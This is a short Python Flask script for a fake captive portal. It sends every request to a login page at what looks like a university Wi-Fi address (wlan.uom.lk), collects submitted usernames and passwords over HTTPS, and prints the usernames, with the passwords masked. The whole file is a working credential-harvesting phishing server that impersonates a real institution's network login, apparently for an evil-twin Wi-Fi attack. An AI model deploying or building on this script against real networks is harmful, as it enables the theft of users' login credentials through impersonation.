from flask import Flask, request, redirect

app = Flask(__name__)

# Catch-all to trigger the popup
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    return redirect("https://wlan.uom.lk/login.html", code=302)

@app.route('/login.html', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        print(f"\n[+] LOGIN RECEIVED via HTTPS!")
        print(f"    User: {username}")
        # SECURITY: Never log passwords, even in test environments
        print(f"    Pass: {'*' * len(password) if password else '(empty)'}")
        return "Login Successful", 200

    return "<h1>Fake UoM Login Page</h1>", 200

if __name__ == '__main__':
    # Run on Port 443 (HTTPS) using your generated keys
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
